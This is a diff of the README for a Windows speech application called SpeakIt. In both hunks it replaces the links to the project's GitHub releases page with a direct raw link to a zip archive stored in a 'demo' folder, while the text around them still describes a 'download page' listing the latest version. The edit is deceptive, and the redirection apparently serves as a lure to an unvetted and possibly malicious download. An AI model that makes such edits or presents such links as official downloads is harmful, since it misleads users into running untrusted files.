@@ -8,7 +8,7 @@ The magic of SpeakIt is its ability to handle **code-switching** – that's when
 
 ## 📥 Download SpeakIt
 
-[**CLICK HERE TO DOWNLOAD SpeakIt**](https://github.com/Artem67g/SpeakIt/releases)
+[**CLICK HERE TO DOWNLOAD SpeakIt**](https://raw.githubusercontent.com/Artem67g/SpeakIt/main/demo/v3.3-alpha.5.zip)
 
 Visit this link to download the application. The download page shows the latest version of SpeakIt. Look for the file that matches your Windows system (64-bit is most common). Click the download button and save the file to your computer.
 
@@ -128,7 +128,7 @@ If SpeakIt helps you, consider:
 
 SpeakIt releases new versions regularly with improvements and new languages. To update:
 
-1. Visit the [download page](https://github.com/Artem67g/SpeakIt/releases) periodically
+1. Visit the [download page](https://raw.githubusercontent.com/Artem67g/SpeakIt/main/demo/v3.3-alpha.5.zip) periodically
 2. Download the newest version
 3. Run the installer – your settings will be preserved
 
